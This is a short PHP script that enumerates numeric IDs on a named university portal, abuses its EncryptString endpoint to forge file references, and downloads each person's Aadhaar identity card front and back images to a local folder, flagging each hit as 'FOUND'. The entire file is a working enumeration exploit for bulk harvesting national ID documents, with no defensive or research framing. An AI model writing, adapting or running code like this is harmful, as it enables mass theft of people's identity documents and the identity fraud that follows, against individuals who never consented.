<?php
$starting=11605370;
$ending=11605380;
function getEncryption($uid){
	$url="https://uims.cuchd.in/UIMS/frmMobResourceLibrary.aspx/EncryptString";
	$post = ['url' => $uid];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS,"{url:'".$uid."'}");
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true );
	curl_setopt($ch, CURLOPT_ENCODING, "gzip,deflate");
	$responseJson = curl_exec($ch);
	$code=substr($responseJson, 6);
	$code=rtrim( $code, '"}' );
	curl_close($ch);
	$response=json_decode($responseJson, true);
	return $code;
}
function getAdharFront($encryptedValue, $uid){
	$url='https://uims.cuchd.in/UIMS/documentfile.ashx?thumbnail=0&FileName='.$encryptedValue;
	$save_to='images/adhar/';
	$filename=basename($url);
	$image=file_get_contents($url);
	if ($image) {
		file_put_contents($save_to.$uid.'AdharCardFront.jpg', $image);
		echo "<h3 style=\"color:red;\">FOUND: $uid</h3>";
	}else{
	}
}
function getAdharBack($encryptedValue, $uid){
	$url='https://uims.cuchd.in/UIMS/documentfile.ashx?thumbnail=0&FileName='.$encryptedValue;
	$save_to='images/adhar/';
	$filename=basename($url);
	$image=file_get_contents($url);
	if ($image) {
		file_put_contents($save_to.$uid.'AdharCardBack.jpg', $image);
		echo "<h3 style=\"color:red;\">FOUND: $uid</h3>";
	}else{
	}
}
for ($i=$starting; $i < $ending; $i++) { 
	$accno=$i;
	getAdharFront(getEncryption($accno.'_Aadhaar_Card_Front.jpg'), $accno);
	getAdharBack(getEncryption($accno.'_Aadhaar_Card_Back.jpg'), $accno);
}